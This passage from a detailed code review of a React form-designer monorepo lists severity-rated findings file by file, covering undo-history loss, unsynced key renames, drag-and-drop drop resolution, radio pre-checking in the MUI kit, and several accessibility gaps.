- **[MEDIUM]** **[E4]** `css.ts:251` — `styleSheetFor` throws on a non-string `node.key`, on the render path: `selectorFor(node.key, scope)` is called before any value guard and `escapeKey` calls `key.replace`. `walk` guards the node's shape but not the key's type, and `validateDocument` reports `"key": 42` without preventing it. `context.ts:161-172` hardened `evaluatorKeys` against this exact document. The throw is inside the renderer's `useMemo`, which in React 19 unmounts the whole form rather than one node.

---

# Area B — `packages/designer`, the builder

## packages/designer/src/store.ts

- **[HIGH]** **[E4]** **(Verified.)** `store.ts:403` — `setProp`'s undo label is `'prop:' + key + ':' + name` and omits the binding *kind*, so a mode switch or a Reset immediately after typing replaces the history entry holding the typed value instead of stacking on it, destroying it in `past` and `present` at once. `commit` at `:70-72` returns `{ past: history.past, present: next, future: [], label }` — `past` is not extended — and this file has already fixed this defect twice, by putting the kind in `setRenderWhen`'s label (`:684`, whose comment describes the failure verbatim) and the type/rule-keys in `setFieldSchema`'s (`:444`). `Properties.tsx:478` passes one `onChange` to the text editors (one `set()` per keystroke), to `ClearButton`, and to `BindingMode`, whose select handler calls the same `onChange` with a fresh binding object. Failure scenario: type "Email address" into Label (one coalesced entry), then switch the Label binding select to "Expression" — the same label matches, `present` becomes the empty expression, and "Email address" is in neither `past` nor `future`. Ctrl+Z lands on the empty original; Ctrl+Y returns the empty expression. Same for Reset, for `setNodeCss` (`:707`) and for `setDataKey` (`:745`).
- **[HIGH]** **[E4]** **(Verified.)** `store.ts:557` — `renameKey` changes `node.key`, which is also the node's *data* key whenever no explicit `dataKey` is set, but repoints nothing that names it, so every condition elsewhere in the document that tests that field silently stops matching. `dataKeyOf` is `node.dataKey ?? node.key` (`tree.ts:540-542`) and `instantiate` never writes a `dataKey`, so a freshly-dropped component's answer name *is* its key. The only rewrite performed is `repointBinding` on the renamed node's own `renderWhen`, and — confirmed by reading `tree.ts:252-296` — it touches only `literal` operands inside a comparison that reads `context`, saying so itself: "a `ref` names a data key, which the copy shares deliberately". That "deliberately" is true for `duplicateNode`, its other caller, and false for a rename, where the data key genuinely moved. Failure scenario: a Paragraph whose `renderWhen` reads `{kind:'ref',dataKey:'email'}`; rename `email` → `emailAddress` and the rule reads an answer nothing writes — the Paragraph is permanently hidden, and because `renderWhen` gates validation, `validateForm` skips whatever is inside it on the server too. `setDataKey` (`:734-746`) has the identical hole from the other direction. The comment at `:550-556` ("The key and anything that names it") overstates what the code does.
- **[MEDIUM]** **[E4]** `store.ts:333` — the `validateDocument` effect's trailing comment says "Once, for the document this hook was mounted with", but its dependency is `[initial]`, so it re-runs on every identity change of a prop the hook otherwise ignores after mount. `README.md:22` documents the pattern `initialDocument={form} onChange={setForm}`, under which `form` is a new object per edit. A host following the README gets a full-document structural walk plus a repeated `console.warn` on every keystroke, describing a document `useDesigner` has already discarded.
- **[MEDIUM]** **[E3]** `store.ts:387` — when `addComponent`'s commit is refused because the document moved, the guard covers only the history: `setSelectedKey(node.key)` on the next line runs unconditionally, and `duplicateComponent` (`:640-642`) likewise still sets the selection and returns `copy.key` after refusing. With two writes landing in one tick, the component is not inserted, but `Designer.tsx:128` announces "Text added to root." and `Tree.tsx:240-241` announces a duplication and calls `focusRowSoon`, whose `querySelector` finds nothing and drops focus to `document.body` — the regression `Tree.tsx:251-264` was written to fix. A silent no-op reported as success.
- **[LOW]** **[E2]** `store.ts:536` — `renameKey` decides against `history.present.root` from the render closure but writes through `apply`, whose updater receives `h.present`. The collision check and the existence check can both pass against a document the write does not land on, producing a duplicate key that `updateNode` resolves to the first match forever after. The other two writers that must decide before writing use `latest.current` plus a commit-time identity check; this one uses neither.
- **[NOTE]** `store.ts:216-231` — an orphaned doc comment: a second `/** … */` follows it, so TypeScript attaches only the second and `writeNode` at `:247` is undocumented. Its content is also stale — it says the comparison is done "Compared as JSON, on one node", which `writeNode`'s own inline comment exists specifically to contradict.
- **[NOTE]** `store.ts:268` — `same()` is a full structural deep-equality and a `ComponentNode` carries its whole `children` array, so the "a node is small" justification holds only for leaves: setting a prop on the root deep-compares the entire document on every keystroke. `same` also returns `false` past `MAX_CONDITION_DEPTH`, so on a pathologically deep document the no-op guard stops firing.
- **[NOTE]** `store.ts:305` — `selectedKey` runs `findNode` during every render and `selectedNode` runs it again, so each render walks the tree twice.

## packages/designer/src/Designer.tsx

- **[MEDIUM]** **[E4]** `Designer.tsx:663` — the shell shortcut is a *native* `keydown` listener on the `.fs-shell` element, so it fires during ordinary DOM bubbling at that element, strictly before React's delegated listener at the root container dispatches any synthetic handler in the subtree. `Tree.tsx:250`'s `event.stopPropagation()` therefore cannot suppress it, and both handlers run for a Delete/Backspace on a tree row. What keeps this harmless today is that `removeNode` returns the identical root for a key it cannot find (`tree.ts:489-491`), so the second `commit` is an identity no-op — not the `stopPropagation` that `Tree.tsx:247-250` and `docs/spec/04-shell.md`'s "Known conflict" both credit. The mitigation is incidental: it holds only while `selectedKey` and the focused row are the same node, which nothing enforces.
- **[MEDIUM]** **[E3]** `Designer.tsx:638` — Escape during a drag both abandons the drag and clears the selection, against `docs/spec/04-shell.md:159` ("Escape clears the selection, *or* abandons a drag if one is in progress"). `drag.ts:285-288` registers its own `keydown` on `window` and the shell handler has no access to `drag.state` and no drag guard, so both run — shell first, since `.fs-shell` is below `window` in the bubble path.
- **[LOW]** **[E4]** `Designer.tsx:626` — `backspaceIsSafe` inverts when `event.target` is not an `HTMLElement`: `target` is `null`, so `target?.closest(…)` is `undefined` and `undefined !== null` is `true`, marking the keystroke safe. The neighbouring clause on line 625 guards the same case correctly with `=== true`. The same `null` target also defeats the `typing` guard and the modal guard, so all three protections fail open together. Reachable only when focus sits on a non-HTML element inside the shell, which is why this is LOW.
- **[LOW]** **[E3]** `Designer.tsx:128` — `commitDrop` and `LeftPane`'s `onAdd` announce an insert unconditionally, but `addComponent` returns without committing when `insertNode` matched nothing or the document moved. A screen-reader user is told an insert happened that did not. `moveComponent` has the same shape against `moveNode`'s illegal-move no-op.
- **[NOTE]** `Designer.tsx:245-247` — the focus-steal exemption selector omits `[contenteditable]`, while the keyboard handler at `:573` explicitly checks `isContentEditable`, so the file already assumes a contenteditable can hold focus here.

## packages/designer/src/index.ts

No issues found.

## packages/designer/src/keyboard.ts

- **[HIGH]** **[E4]** **(Verified. Converged: two slices.)** `keyboard.ts:145` — the `left` branch resolves the parent row with `rows.find((r) => r.node.key === row.parentKey)`, the key-matching mistake the sibling code twelve lines above went out of its way to avoid. The comment at `:100-113` states the premise plainly — "Two nodes can share a key … matching on `parentKey` alone collected the children of *every* parent with that name" — and derives the sibling run from contiguous depth instead; this branch then reverts to a bare key match, and `find` returns the *first* row with that key. Both fields read off it are positional. Traced on the repo's own `twoStacks()` fixture (`keyboard.test.ts:204`): `moveTarget(flatten(twoStacks()), 'c', 'left', isContainer)` answers `index: 1` where the correct answer is `2`. `moveNode` performs it happily and `describeMove` announces "moved out one level." The fix is the same shape as the sibling run: scan backwards from `index` for the first row with `depth === row.depth - 1`.
- **[LOW]** **[E3]** `keyboard.ts:139` — the `right` branch asks the *kit* whether the previous sibling is a container while `moveNode` asks the *node* (`tree.ts:521`). A node whose type the kit marks `container: true` but which carries no `children` array yields a `MoveTarget` that `moveNode` silently refuses, after which `Tree.tsx:202-203` announces a move that did not happen. `store.ts:208` already uses the node-shaped test for the same question.

## packages/designer/src/Icon.tsx

- **[NOTE]** `Icon.tsx:216-222` — the doc heading "Decorative by default" implies an override that does not exist: `IconProps` exposes only `name` and `size`, and `aria-hidden="true"` is unconditional. No `dangerouslySetInnerHTML` anywhere in the file, and the `if (!glyph) return null` guard is a genuine runtime check for a name a third-party kit invents.

## packages/designer/package.json

- **[NOTE]** `packages/designer/package.json:33` — `react-dom` is a required peer dependency that no file under `packages/designer/src` imports. Invariant 2 is otherwise clean: the only runtime dependencies are `@formsmith/core` and `@formsmith/renderer`.
- **[NOTE]** `packages/designer/package.json:9-15` — no `./package.json` subpath in `exports`.

## packages/designer/tsconfig.json

No issues found.

## packages/designer/README.md

- **[MEDIUM]** **[E4]** `packages/designer/README.md:18-23` — the only usage example is written as a controlled component (`initialDocument={form}` with `onChange={setForm}`), which is precisely the contract the designer does not honour. `Designer.tsx:29-37` and `docs/spec/12-api.md:50-52` both state that `initialDocument` is read once at mount; `store.ts:286` consumes it in a `useState` initializer. Two consequences: a reader concludes the document can be driven from outside, and — because `form` becomes a new object per edit — `store.ts:333`'s `[initial]`-keyed effect re-runs `validateDocument` on every keystroke. `apps/playground/src/App.tsx:60-98` documents having been bitten by the first half and keeps the live document in a ref to avoid it; the README teaches the opposite.

## packages/designer/src/dnd.ts

- **[HIGH]** **[E4]** **(Verified.)** `dnd.ts:223-238` — `resolveDrop` compares the pointer against child midpoints on **one** axis only, so a wrapping container resolves drops against the wrong child and most of its slots are unreachable; both shipped kits have one. `inferAxis` (`:43`, read in full) collapses layout to `'row' | 'column'` by summing `|Δleft|` vs `|Δtop|`, and the slot loop tests `position < middle` on that single axis. `kit-html/src/renderers.tsx:422` and `kit-mui/src/renderers.tsx:454` both render `Grid` as `gridTemplateColumns: repeat(auto-fit, minmax(min(${minWidth}px,100%), 1fr))` — a genuinely 2-D wrapping layout, `container: true`, with a palette entry in both kits (verified). Failure scenario: a default `Grid` (`columns: 2`) holding four children lays them out 2×2; `inferAxis` answers `'row'`, and a drop into the bottom-right cell resolves to slot 1 — between the two children of the *top* row — with the drop bar drawn a row away from the pointer. Slots 2 and 3 are unreachable by any pointer position. `05-canvas.md` explicitly promises this case. Covered by neither jsdom nor `e2e/`.
- **[MEDIUM]** **[E4]** **(Blocked — see the verification note.)** `dnd.ts:272-276` — `documentIndex` returns the raw filtered **slot** for a same-parent move, which is a valid document index only when every sibling drew an element. `Candidate.index` is the true document index while `slot` is a position in the drawn-and-filtered list, and `moveNode` is `insertNode(removeNode(root, key), parentKey, node, index)`, so `index` is read against the post-removal *document* children. `measureTree` skips any node with no `[data-fs-key]` element and its whole subtree (`geometry.ts:193-194`), which `ARCHITECTURE.md` names as a supported kit outcome. The agent further claims `dnd.test.ts:302` pins the wrong value for this shape.
- **[LOW]** **[E2]** `dnd.ts:131` — `let best = groups[0] as Candidate[]` is an unsound cast that defeats `noUncheckedIndexedAccess`. The `rows.size <= 1` guard makes it true today.
- **[LOW]** **[E4]** `dnd.ts:417-418` — the `anchor === -1` fallback in `resolveTreeDrop` is unreachable: `siblings` always contains `row`, because any row whose key is `draggedKey` was already rejected at `:395`. It reads as a safety net that is not one.
- **[NOTE]** **[E2]** `dnd.ts:202-206` — `siblings` (a second filter, map build and sort) is computed unconditionally but only read after the `children.length === 0` early return, so it is dead work on every pointer move while hovering an empty container.
- **[NOTE]** **[E2]** `dnd.ts:133-146` — `inOneRow`'s nearest-group fallback measures vertical distance only, in a module whose stated principle is to infer layout rather than assume it.

## packages/designer/src/drag.ts

- **[MEDIUM]** **[E4]** `drag.ts:189, 344-346` — nothing filters events by `pointerId` or `isPrimary` (a repo-wide grep returns no matches), so **any** pointer's `pointerup` ends and commits the drag started by a different pointer. Failure scenario on touch, which `05-canvas.md` calls a supported target: finger A drags a palette entry onto the canvas; finger B taps Preview and lifts; finger B's `pointerup` resolves the zones at finger B's coordinates and commits an insertion there, while finger A is still down and the drag label still follows it.
- **[LOW]** **[E4]** `drag.ts:147-160` — the comment states that zone answer order is made predictable by `Map` insertion order, but both registrations are recreated on every document edit and `Map` delete-then-set moves a key to the end. Order is `{canvas, tree}` on a fresh mount and `{tree, canvas}` after the first edit. The stated invariant is false.
- **[NOTE]** **[E3]** `drag.ts:138-145` — `begin` unconditionally overwrites `pending.current` with no in-flight check, so a second press mid-drag silently retargets the drag. Same root cause as the pointerId finding; a single-pointer fix is cheaper than full pointer tracking.

## packages/designer/src/geometry.ts

- **[LOW]** **[E4]** `geometry.ts:193, 105-107` — `measureTree` runs one `querySelectorAll` over the whole surface per document node, so measuring is O(n·m). It runs on the first pointer move of every drag *and* again on every release, so a large form pays two full-surface sweeps per node per gesture. A single `querySelectorAll('[data-fs-key]')` bucketed into a `Map` is one pass.
- **[NOTE]** **[E4]** `geometry.ts:157-166, 193-194` — the docblock says a skipped node is "a node whose kit renderer drew nothing at all", but the code's condition is "no element carries this `data-fs-key`", a strictly broader set. `ARCHITECTURE.md` states a kit that forgets `nodeProps` "still renders correctly" — such a container is fully on screen, yet line 194 returns before visiting its children, so the container and its entire visible subtree vanish from drop resolution.

## packages/designer/src/panels/Canvas.tsx

- **[MEDIUM]** **[E4]** **(Downgraded from HIGH — see the verification note.)** `Canvas.tsx:483-523` — `resolveRelease` has no bounds check, so a release outside the surface is converted into content coordinates and can be claimed as a drop. Verified by reading the function: the block comment at `:487-495` describes such a check as "the question the zone is for" and the code that follows contains none, while the docblock at `:476-481` says the opposite ("No bounds check of its own") and explains that adding one broke legitimate drops onto a scrolled form. `originOf` subtracts `scrollTop`, so local `y = clientY - surfaceTop - clientTop + scrollTop` with no clamp. Failure scenario: a form scrolled down 300px, surface top at clientY 100, release at clientY 80 over the canvas bar — local y = 280, inside the root container's rect, and the drop commits instead of the gesture being abandoned. Downgraded because the missing check is a deliberate, documented trade-off rather than an oversight; the defect to fix is the contradictory dead comment, and the correct guard is a clamp to the scrollable content box rather than the client box.
- **[MEDIUM]** **[E3]** `Canvas.tsx:380-396` — `onPointerDownCapture` never calls `preventDefault` or `stopPropagation`, so `pointerdown` is the one interaction event the canvas does not intercept while editing, while `onMouseDownCapture`, `onClickCapture` and `onKeyDownCapture` all cancel. `05-canvas.md` records that cancelling `mousedown` alone was insufficient because MUI's Select opens from an inner `onMouseDown`; the identical argument holds for a kit whose controls open on `onPointerDown`, which is what Radix-based components do and what `ARCHITECTURE.md:35` names as the next kit.
- **[LOW]** **[E4]** `Canvas.tsx:210-213` — `findParent(api.document.root, selectedKey)` runs unmemoized during render, and `Canvas` re-renders on every `pointermove` of every drag. Every other tree walk in this component is behind a `useMemo`.
- **[LOW]** **[E4]** `Canvas.tsx:505-518` — the drag snapshot is released only from inside `resolveRelease`, which is never reached for an abandoned drag, so the comment's claim that the snapshot "goes with the drag" is untrue on the Escape, `pointercancel`, `blur` and `visibilitychange` paths. Bounded to one snapshot, so stale data and a wrong comment rather than a growing leak.
- **[NOTE]** **[E2]** `Canvas.tsx:393` — `begin({ kind: 'move', key, label: key })` passes the node key as the human label, so `DragSource.label` is redundant with `key` at both call sites and the drag label shows a raw key.

## packages/designer/src/panels/SelectionLayer.tsx

- **[NOTE]** **[E4]** `SelectionLayer.tsx:88, 143, 171` — the `document` prop shadows the global `document` for the whole component body. Nothing here touches the global today, and the prop is used solely as a re-measure trigger, so a name like `documentVersion` would carry the same signal without the shadow.
- **[NOTE]** **[E3]** `SelectionLayer.tsx:149-161` — the `ResizeObserver` watches the surface and the form root only, so a nested component that changes size without changing the root's border box leaves the frame stale. Mitigated because the layer only renders while editing, where every document edit re-runs the measure effect.

## packages/designer/src/panels/Tree.tsx

- **[LOW]** **[E4]** `Tree.tsx:344-345` — `flatten(root)` runs during every render of `Tree`, including every render caused by a pointer move anywhere in the designer, allocating an array of every node per pointer event. `:180-181` does `flatten(root)` and `indexKit(kit)` on every keystroke on a row, including keys the handler goes on to ignore.
- **[LOW]** **[E4]** `Tree.tsx:82-84` — `measureNow` issues one `list.querySelector` per document node rather than a single sweep. Same shape as the `geometry.ts` finding.
- **[LOW]** **[E2]** `Tree.tsx:411-487` — the `role="group"` sublist is a *sibling* of the `role="treeitem"` div with `role="none"` on the `<li>` between them, so both become children of the `tree` and nothing owns the group, while `aria-expanded` is set on a treeitem with no owned group. Partly mitigated by the explicit `aria-level` on every row.

## packages/designer/src/panels/LeftPane.tsx

No issues found.

## packages/designer/src/panels/Palette.tsx

- **[NOTE]** **[E4]** `Palette.tsx:111` — `GROUP_LABELS[group.group] ?? group.group` is unreachable per the declared types (`PaletteGroup` is a closed union and `GROUP_LABELS` is a total `Record`), so the compiler cannot tell a reader whether it is live. It is genuinely live only for a JavaScript-only third-party kit, which is what the comment says.

## packages/designer/src/panels/Properties.tsx

- **[HIGH]** **[E4]** **(Verified — and worse than reported. Converged: two slices.)** `Properties.tsx:74` — `KeyField` is the one editor in this panel with neither a React `key` nor a re-sync guard, so after any selection change it shows, and will commit, the *previously* selected component's key. Verified end to end: `KeyField` seeds `draft` with `useState(value)` at `:253` and binds `value={draft}` at `:282` with no `if (value !== committed)` block, while every sibling editor either carries one (`DataKeyField` at `:153-173`, `JsonEditor` at `:788`) or is remounted by an explicit key (`:82`, `:97`, `:469`). The docblock at `:66-72` justifies the missing key with "the panel above already remounts on that", and it does not: `Inspector.tsx:47` renders `<Properties api={api} kit={kit} />` unkeyed and `Designer.tsx:319` renders `<Inspector>` unkeyed (both read). `store.ts:305` derives `selectedKey` and keeps it defined when moving between two live nodes, so `Properties` never takes its `!node` early return and `KeyField` never unmounts. Failure scenario: select `email`, then click `phone` — the Key row reads `email` under a heading naming `phone`, carrying any refusal alert left over from `email`. Then delete `email` (the selection stays on `phone`), click into the Key box and press Enter: `commit()` compares draft `'email'` against value `'phone'` and calls `api.renameKey('phone','email')`, which now succeeds — `phone` is silently renamed to `email`, taking its `dataKey` fallback and therefore the submitted payload key with it. This is the failure `06-inspector.md` records as already fixed ("the panel silently began editing a different node").
- **[LOW]** **[E4]** `Properties.tsx:379-386` — the Show-when `<select>` handler has no branch for `other` and no final guard, so any option value that is not `always`/`never`/`computed` falls through to "author a condition". Unreachable today only because the `other` option is rendered only when the select's value is already `other`; a fifth option would silently overwrite the document with a condition.
- **[NOTE]** **[E4]** `Properties.tsx:38-39` — a `PropSchema.section` that is not `main`, `advanced` or `style` makes the row vanish from every tab with no warning. The union type blocks this for a TypeScript kit, but the file's own philosophy for an unknown `editor` ("still falls back to a single-line text input rather than failing") is not applied to an unknown `section`.

## packages/designer/src/panels/ConditionEditor.tsx

- **[MEDIUM]** **[E4]** `ConditionEditor.tsx:735-738` — the "Add condition" button mints `emptyCondition(dataKeys[0] ?? '')`, i.e. `{ kind: 'ref', dataKey: '' }`, the exact shape `switchKind` at `:339-352` was changed to stop producing. Core's gate does not catch it: `tree.ts:1054` validates a `ref` with `text(value['dataKey'])`, which accepts the empty string. Failure scenario: a component whose `renderWhen` is a group, in a document where the data-key list has emptied — the new clause reads nothing, the group is false forever, the component is permanently hidden, and `validateForm` skips every rule beneath it while `validateDocument` reports the document clean.
- **[LOW]** **[E4]** `ConditionEditor.tsx:451-455` — `spell` is declared `: string` and returns `undefined` for an operand of `{ kind: 'literal' }` with no `value`, which `tree.ts:1075-1076` explicitly permits. `LiteralField` then does `useState(undefined)` and renders `<input value={undefined}>` — an uncontrolled input that flips to controlled on the first keystroke.
- **[NOTE]** **[E2]** `ConditionEditor.tsx:121` — `const carried` shadows the `carried` declared at `:89`; in two branches the outer computations, including a recursive `asCondition`, are all discarded.

## packages/designer/src/panels/Rules.tsx

- **[LOW]** **[E3]** `Rules.tsx:313-427` — a rule carrying a `when` guard is drawn as an ordinary unconditional rule with nothing saying it is guarded; `RuleRow` never reads `rule.when`, and edits preserve it silently. The panel's own stated principle is that behaviour that is otherwise invisible gets said out loud. A guarded `required` reads as "this field is always required" while `applyRule` may skip it, and `10-interchange.md` records that a guarded `required` is also silently dropped from the exported JSON Schema.
- **[NOTE]** **[E2]** `Rules.tsx:362-380` — inside a block already guarded by `rule.key === 'pattern'`, the discriminant is re-tested three more times and `patternProblem(rule.value)` is called four times per render, compiling a `RegExp` each time, on every keystroke in the pattern box.

## packages/designer/src/panels/Binding.tsx

- **[MEDIUM]** **[E4]** `Binding.tsx:356` — `<label htmlFor={fieldId}>{language.name}</label>` renders the language name unguarded, so a language with an empty name produces a text input with no accessible name. `FormSettings.tsx:85` writes `name: name.trim()` with an explicit comment that a nameless language is a supported state, and has a `nameOf` helper for this shape that this file lacks. `docs/accessibility.md:17` lists "Every form control in the shell has a label" as a build-failing check; no fixture exercises a nameless language, which is why it passes.
- **[MEDIUM]** **[E4]** `Binding.tsx:251-268` — renaming a translation key onto a key another component already uses silently overwrites that component's text, per language, and only in the languages where the old key had text. `carried` is built from the old key's bundle entries and filtered to non-empty; `onRename` then writes each under `next` unconditionally with no check for an existing entry. Sharing one key between two components is a supported feature per `07-bindings.md`, so the collision target is a real state. Failure scenario: the two languages end up disagreeing about which string the key names.
- **[MEDIUM]** **[E3]** `Binding.tsx:317-336` — one translation-key rename produces `1 + 2n` undo entries with `n` languages holding text, each individually undoable into an inconsistent state, because `commit` only folds *consecutive* edits sharing a label and the loop alternates between the new key and the old key. With three languages, one rename costs seven of the hundred history slots.
- **[LOW]** **[E4]** `Binding.tsx:213, 261, 347` — `bundleFor(...)` returns a plain object and the callers index it with an author-typed key using a bare lookup, so `Object.prototype` members are reachable; core fixed this exact pattern for action references with `Object.hasOwn`. Typing `toString` as the translation key yields a `Function` in a controlled `<input value={…}>`, and renaming that key stores it.

## packages/designer/src/panels/StyleTab.tsx

- **[MEDIUM]** **[E4]** `StyleTab.tsx:132-146, 195-199` — a structured control whose text `safeDeclarations` refuses discards the typed text and snaps back to the old value with no message, while the raw box beside it explains the identical refusal. `commit` sets `committed` to `draft` before calling `onCommit`; `onCommit` returns early when `safeDeclarations(written)` is falsy, so `api.setNodeCss` is never called and the `value` prop does not move, and the re-render then overwrites `draft` with the stale `value`. Failure scenario: type `6px}` into Radius and press Enter — the field blanks back to its previous value with no reason given and no chance to delete the stray character.
- **[LOW]** **[E2]** `StyleTab.tsx:283-291` — the refusal message is delivered by adding `role="alert"` to a `<p>` already in the DOM rather than by mounting a new element, which every other error in this slice does. A role applied to a live element is unreliably announced, so the one control that refuses input silently is also the one whose refusal may not be spoken.

## packages/designer/src/panels/FormSettings.tsx

- **[MEDIUM]** **[E4]** `FormSettings.tsx:89, 126, 130` — `doc.languages` is read as an array three times with no guard, so a host document whose `languages` is not an array throws out of this panel's render. `nameOf` at `:33` exists specifically because "a `Language` arrives from a pasted document", and its docblock states that a throw during render in React 19 unmounts the whole designer: the shape of each language is defended and the shape of the list is not. Failure scenario: the Form tab is the tab the left pane can open, `doc.languages.map` throws, and the designer — including the JSON dialog that would repair the document — is gone.
- **[LOW]** **[E4]** `FormSettings.tsx:156-158` — the default-language radio group uses a hardcoded, document-global `name="fs-default-language"`, and this markup is deliberately not inside a `<form>`, so two `Designer` instances on one page share a single radio group. The renderer stamps a per-instance `data-fs-scope` for exactly this class of collision.

## packages/designer/src/panels/DocumentDialog.tsx

- **[MEDIUM]** **[E4]** `DocumentDialog.tsx:190, 347-353` — `slugify(doc.name)` calls `name.trim()` on an unvalidated document during render of the dialog body, so opening the JSON dialog on a document whose `name` is not a string throws and unmounts the designer. `validateDocument` requires `name` to be text but `store.ts:333-341` warns rather than refuses, and this file's own docblock calls this dialog the place for "getting JSON out and putting edited JSON back in" — it is the repair surface for exactly the documents that reach it this way.
- **[NOTE]** **[E3]** `DocumentDialog.tsx:174-188` — the 10 MB `MAX_IMPORT` bound applies only to the file picker; the textarea path has no size bound at all, so a paste is unbounded work on the main thread. The docblock argues the bound from the string ending up in a textarea, which is the state a paste reaches directly.
- **[NOTE]** **[E2]** `DocumentDialog.tsx:148-151, 180-187` — `copy` and `onFile` set state from promise continuations and `DialogBody` unmounts as soon as `open` goes false, so a slow clipboard write or file read that resolves after dismissal drops its message — the only feedback those two paths have.

## packages/designer/src/panels/Tabs.tsx

No issues found.

## packages/designer/src/panels/Inspector.tsx

- **[MEDIUM]** **[E4]** `Inspector.tsx:46-50` — none of the three panels is keyed by `api.selectedKey`, so every panel and every editor inside it is reconciled in place across a selection change and keeps its local state. Most editors survive this only because each carries its own re-sync guard — `DataKeyField`, `JsonEditor`, `LiteralField`, `OptionsField`, `NumberField`, `DeclarationField`, `RawCss`, `TranslationKeyField` — and the ones that do not are keyed per node at their call site. `KeyField` is neither, which is the HIGH above. The safety of this whole panel rests on eight independent re-sync guards rather than on one key, and a ninth editor added without one inherits the same bug.

---

# Area C — the renderer and the kits

## packages/renderer/src/index.tsx

- **[MEDIUM]** **[E4]** **(Verified.)** `renderer/src/index.tsx:196` — a `computed` prop is evaluated against top-level `data` only, so inside a repeater row it reads the wrong scope, while the `condition` branch twelve lines up passes `options.row`. Both branches read: `case 'condition'` calls `evaluateCondition(value.condition, data, options.context, options.row)`; `case 'computed'` calls `options.evaluate(value.expression, data, options.context)` with no row merge. The other two evaluator call sites in the project both merge and both say why — `visibility.ts:52` (`const scoped = options.row ? { ...data, ...options.row.values } : data`, whose comment records this exact bug for `renderWhen`) and `validation.ts:567` for the `custom` rule. Failure scenario: a repeater row holding `{qty: 3}` and a field whose `label` is a computed binding reading `qty` — the expression sees the absent form-level `qty`, resolves the same wrong value in every row, and nothing reports it.
- **[MEDIUM]** **[E4]** `renderer/src/index.tsx:340` — the node boundary's retry only fires on a key or type change, so the case its own docblock is written about is still broken. `getDerivedStateFromProps` returns `null` unless `props.node.key`/`node.type` differ, while the docblock says the motivating case is "an author writes a property value that breaks a renderer, fixes it, and the box stays"; a prop edit produces a new `ComponentNode` with the same key and type. Comparing `props.node !== state.forNode` would retry on edits without retrying on every render.
- **[MEDIUM]** **[E4]** `renderer/src/index.tsx:811` — `document.root` is the one document field `FormRenderer` does not guard, and an unguarded root throws *outside* every boundary. `translations` gets a full shape guard at `:756-777` with a comment saying a host "is free not to" call `validateDocument`; `document.root` goes straight into `<RenderNode node={document.root} />`, and `NodeBoundary`'s class-field initializer at `:320` reads `this.props.node.key` unconditionally. A throw in a boundary's own constructor is not caught by that boundary and nothing sits above `FormRenderer`, so React 19 unmounts the host's tree — the blank page the boundary's docblock exists to prevent.
- **[LOW]** **[E4]** `renderer/src/index.tsx:458` — `childrenOf` guards that `children` is an array but not what is in it, so a `null` element throws at `child.key` inside `RenderNodeBody` and the *parent's* boundary catches it: one bad element replaces the whole container and every sibling under it, where the intended blast radius is one node.
- **[LOW]** **[E3]** `renderer/src/index.tsx:480` — the props memo can never hit for the case that matters: its dependency list includes `data`, which is a new object on every keystroke. A repeater near the `MAX_ROWS` cap re-runs `isVisible` + `resolveProps` and allocates a fresh props identity for every node under every row on each keystroke, defeating identity-comparing kit components.
- **[NOTE]** **[E2]** `renderer/src/index.tsx:637` — `isVisible` is evaluated twice per node per render whenever `revealHidden` is set, each call reaching the host evaluator for a `computed` `renderWhen`. Designer canvas only.
- **[NOTE]** **[E2]** `renderer/src/index.tsx:616-625` — the docblock claims "Nothing here can throw for a reason a document controls", but `RenderNode` also calls `encodeRow`, `isVisible` and constructs `NodeBoundary`. Total today; the guarantee stated is not one the code enforces.

## packages/renderer/package.json

- **[LOW]** **[E2]** `packages/renderer/package.json:31` — `react-dom` is a required peer dependency the package never imports.

## packages/renderer/tsconfig.json

No issues found.

## packages/renderer/README.md

- **[NOTE]** **[E2]** `packages/renderer/README.md:49` — "That puts `data-fs-key` and `data-fs-type` in the output" omits `data-fs-scope`, which `02-kit-contract.md` calls load-bearing for two forms on one page and which `test/kit-contract.test.tsx` enforces per kit.
- **[NOTE]** **[E2]** `packages/renderer/README.md:44` — the example kit uses `String(value ?? '')`, the pattern both in-repo kits abandoned for `jsonToString`; it renders an object value as `[object Object]` into an input.

## packages/kit-mui/src/renderers.tsx

- **[HIGH]** **[E4]** **(Verified.)** `kit-mui/src/renderers.tsx:708` — every `RadioItem` child renders pre-checked while its group is unanswered, and all of them at once. `RadioItemNode` passes `value={str(props['value'])}`, whose palette default is `''`; `RadioGroupNode` passes `value={jsonToString(value)}` = `''` for an unanswered field; MUI's `FormControlLabel` forwards `value` to the cloned control and `Radio` computes `checked = areEqualValues(radioGroup.value, props.value)` → `'' === ''` → `true`. `kit-html` fixed exactly this and says so in a comment — read side by side: `kit-html/src/renderers.tsx:740` guards with `checked={group ? value !== '' && group.selected === value : false}` and explains that "a value nobody wrote is not the selected one"; the MUI file has no such guard. Failure scenario: a group built from `RadioItem` children shows a selected option before anyone answers; the user submits, `required` fails against data that is empty, and the control on screen says it was answered.
- **[MEDIUM]** **[E4]** `kit-mui/src/renderers.tsx:820` — the "too large" file notice can never be announced, though the comment at `:861-866` says "And somebody is told." The message is only produced when `error` is undefined, while the alert role is only added when `error` is set (`alertWhenError` returns `{}` for a falsy error). The two conditions are mutually exclusive, so the string never carries `role="alert"`, is not a live region, and lands in the `aria-describedby` target, whose changes are not announced. `kit-html` renders the same event in its own `<p role="alert">`.
- **[LOW]** **[E4]** `kit-mui/src/renderers.tsx:142` — `Screen`'s `maxWidth` (and `Grid`'s at `:459`) is passed to `sx` as a bare number, the one length in this file that skips `px()`. MUI's sizing transform reads `value <= 1 && value !== 0` as a percentage, which `ImageNode`'s own comment documents as the reason `width` uses `px()`. A document authoring `maxWidth: 1` renders `1px` in one kit and `100%` in the other.
- **[NOTE]** **[E4]** `kit-mui/src/renderers.tsx:700-704` — the comment "Deliberately not wired to the group's value… making this self-controlling would give one question two sources of truth" is false: MUI's `Radio` reads `useRadioGroup()` from context regardless of the wrapping `Box`, which is what the contract's "A RadioItem child can be selected in its group" rule requires. The wrong comment is plausibly why the empty-value guard above was never added here.
- **[NOTE]** **[E2]** `kit-mui/src/renderers.tsx:547` — a refused or empty `src` renders `<img src="">`, while `LinkNode` degrades a refusal from the same `safeHref` allowlist to plain text and says why. One allowlist, two behaviours.
- **[NOTE]** **[E2]** `kit-mui/src/renderers.tsx:188` — the repeater's inner `role="group"` has no accessible name, so a screen reader announces an unnamed group around every row.
- **[NOTE]** **[E2]** `kit-mui/src/renderers.tsx:492` — `titleTypographyProps` is the deprecated API on the upper half of the declared peer range; still honoured in the installed 7.3.11, so drift rather than a defect — but the same hazard class the Checkbox comment records for `inputProps`, where a silent drop cost the Switch every ARIA attribute.

## packages/kit-mui/src/definitions.ts

